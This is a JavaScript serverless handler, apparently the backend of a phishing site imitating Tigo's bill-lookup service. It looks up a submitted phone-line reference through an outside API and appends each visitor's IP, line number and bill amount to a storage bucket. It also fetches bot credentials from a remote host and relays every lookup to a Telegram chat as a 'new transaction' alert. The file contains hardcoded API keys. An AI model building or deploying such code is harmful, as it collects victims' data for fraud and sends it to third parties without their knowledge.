require('dotenv').config();

const https = require('https');
const crypto = require('crypto');
const AWS = require('aws-sdk');

const API_KEY = 'tigo_a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6';

const s3 = new AWS.S3({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    endpoint: process.env.R2_ENDPOINT,
    s3ForcePathStyle: true,
    signatureVersion: 'v4',
    region: 'auto'
});

const BUCKET = process.env.R2_BUCKET;

function generarTxid() {
    return crypto.randomBytes(16).toString('hex');
}

async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
    try {
        const apiKey = process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v';
        console.log('[Telegram] Obteniendo credenciales de laboratorio.lol con site:', site);

        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 5000);

        const response = await fetch(
            `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
            { headers: { 'X-API-Key': apiKey }, signal: controller.signal }
        );
        clearTimeout(timeout);

        const data = await response.json();
        console.log('[Telegram] Respuesta de laboratorio.lol:', data);
        const token = data.token || data.bot_token;
        const chatId = data.chat_id;
        console.log('[Telegram] Token obtenido:', token ? '✓' : '✗', 'ChatId:', chatId ? '✓' : '✗');
        return { token, chatId };
    } catch (error) {
        console.error('[Telegram] Error obteniendo credenciales:', error.message);
        return null;
    }
}

async function enviarNotificacionTelegram(txid, transaccion) {
    try {
        console.log('[Telegram] Iniciando envío de notificación...');
        const creds = await obtenerCredencialesTelegram('tigoconsulta');
        console.log('[Telegram] Credenciales obtenidas:', creds ? '✓' : '✗');
        if (!creds?.token || !creds?.chatId) {
            console.log('[Telegram] ✗ Credenciales inválidas. Token:', creds?.token ? '✓' : '✗', 'ChatId:', creds?.chatId ? '✓' : '✗');
            return;
        }
        const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Línea:</b> ${transaccion.referencia}\n<b>Valor:</b> ${transaccion.valor_formateado}\n<b>Estado:</b> ${transaccion.estado}\n<b>IP:</b> ${transaccion.ip}`;
        console.log('[Telegram] Enviando mensaje a chat:', creds.chatId);
        const telegramRes = await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: creds.chatId, text: mensaje, parse_mode: 'HTML' })
        });
        const telegramData = await telegramRes.json();
        console.log('[Telegram] Respuesta:', telegramData.ok ? '✓ Enviado' : '✗ Error: ' + telegramData.description);
    } catch (error) {
        console.error('[Telegram] Error:', error.message);
    }
}

async function guardarConsultaFactura(txid, datos, clientIp) {
    const consulta = { txid, ip: clientIp, referencia: datos.referencia, valor_pago: datos.valor_pago, valor_formateado: datos.valor_formateado, convenio: datos.convenio, estado: 'pendiente', timestamp: new Date().toISOString() };
    return new Promise((resolve, reject) => {
        s3.getObject({ Bucket: BUCKET, Key: 'datos_consultas.txt' }, (err, data) => {
            let content = '';
            if (!err && data?.Body) content = data.Body.toString();
            content += JSON.stringify(consulta) + '\n';
            s3.putObject({ Bucket: BUCKET, Key: 'datos_consultas.txt', Body: content, ContentType: 'text/plain' }, (err) => {
                if (err) reject(err);
                else resolve(data);
            });
        });
    });
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(400).json({ ok: false, error: 'POST requerido' });

    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const { referencia } = body;
        if (!referencia) return res.status(400).json({ ok: false, error: 'Referencia requerida' });

        const postData = JSON.stringify({ referencia, api_key: API_KEY });

        const apiResponse = await new Promise((resolve, reject) => {
            const options = {
                hostname: 'api.cloudapi.life',
                path: '/tigo.php',
                method: 'POST',
                timeout: 15000,
                headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
            };

            const apiReq = https.request(options, (apiRes) => {
                let data = '';
                const timeout = setTimeout(() => { apiReq.destroy(); reject(new Error('Response timeout')); }, 18000);
                apiRes.on('data', chunk => { data += chunk; });
                apiRes.on('end', () => {
                    clearTimeout(timeout);
                    try { resolve(JSON.parse(data)); }
                    catch (e) { reject(new Error('Invalid JSON')); }
                });
            });

            apiReq.on('error', reject);
            apiReq.on('timeout', () => { apiReq.destroy(); reject(new Error('Request timeout')); });
            apiReq.write(postData);
            apiReq.end();
        }).catch(err => ({ ok: false, error: 'API: ' + err.message }));

        if (!apiResponse.ok) return res.status(200).json(apiResponse);

        const txid = generarTxid();
        const clientIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'unknown';

        console.log('[API] Iniciando procesos async para txid:', txid);

        // Guardar datos (esperar a que termine)
        guardarConsultaFactura(txid, apiResponse.factura, clientIp).catch(e => console.error('[API] Error guardando:', e));

        // Telegram en segundo plano (NO esperar)
        enviarNotificacionTelegram(txid, { ...apiResponse.factura, ip: clientIp }).catch(e => console.error('[API] Error Telegram:', e));

        console.log('[API] Respondiendo al cliente con txid:', txid);
        return res.status(200).json({ ...apiResponse, txid });
    } catch (error) {
        return res.status(400).json({ ok: false, error: 'Error: ' + error.message });
    }
};
